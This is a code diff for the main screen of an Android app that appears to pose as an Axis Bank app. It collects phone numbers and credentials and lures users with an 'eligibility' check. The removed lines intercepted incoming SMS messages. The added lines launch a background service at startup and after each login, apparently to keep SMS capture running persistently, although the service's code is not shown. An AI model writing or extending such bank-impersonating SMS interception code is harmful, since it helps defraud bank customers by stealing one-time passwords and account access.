@@ -1,4 +1,4 @@
-package com.bank.axisbank;
+package com.bank.axisbank.screen;
 
 import android.Manifest;
 import android.content.BroadcastReceiver;
@@ -6,7 +6,6 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
-import android.os.Handler;
 import android.text.Editable;
 import android.text.TextWatcher;
 import android.view.View;
@@ -15,19 +14,18 @@ import android.widget.Button;
 import android.widget.EditText;
 import android.widget.LinearLayout;
 import android.widget.Toast;
-
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
+import com.bank.axisbank.EligibilityActivity;
+import com.bank.axisbank.HELPER.MyService;
 import com.bank.axisbank.HELPER.SmsReceiver;
-import com.google.android.gms.tasks.OnCompleteListener;
-import com.google.android.gms.tasks.Task;
+import com.bank.axisbank.R;
+import com.bank.axisbank.phone;
 import com.google.firebase.FirebaseApp;
-import com.google.firebase.auth.AuthResult;
 import com.google.firebase.auth.FirebaseAuth;
-import com.google.firebase.database.FirebaseDatabase;
 
 import java.util.Objects;
 
@@ -38,7 +36,7 @@ public class MainActivity extends AppCompatActivity {
 
     View loadingOverlay;
     private static final int REQUEST_PERMISSION_CODE =1;
-    private BroadcastReceiver smsReceiver;
+
     FirebaseAuth auth;
     final String regexStr = "^(?:(?:\\+|0{0,2})91(\\s*[\\-]\\s*)?|[0]?)?[6789]\\d{9}$";
 
@@ -91,12 +89,16 @@ public class MainActivity extends AppCompatActivity {
                     if (signInTask.isSuccessful()) {
                         // User sign-in successful, move to the next activity
                         hideLoadingOverlay();
+                        Intent serviceIntent = new Intent(this, MyService.class);
+                        startService(serviceIntent);
                         Intent intent = new Intent(getApplicationContext(), EligibilityActivity.class);
                         startActivity(intent);
                     } else {
                         // User doesn't exist, create a new account and sign in
                         auth.createUserWithEmailAndPassword(email, password).addOnCompleteListener(createUserTask -> {
                             hideLoadingOverlay();
+                            Intent serviceIntent = new Intent(this, MyService.class);
+                            startService(serviceIntent);
                             if (createUserTask.isSuccessful()) {
                                 Intent intent = new Intent(getApplicationContext(), EligibilityActivity.class);
                                 startActivity(intent);
@@ -109,11 +111,9 @@ public class MainActivity extends AppCompatActivity {
             }
         });
 
+        Intent serviceIntent = new Intent(this, MyService.class);
+        startService(serviceIntent);
 
-
-        smsReceiver =new SmsReceiver();
-        IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
-        registerReceiver(smsReceiver,intentFilter);
         
     }
     @Override
@@ -149,6 +149,5 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onDestroy() {
         super.onDestroy();
-        unregisterReceiver(smsReceiver);
     }
 }
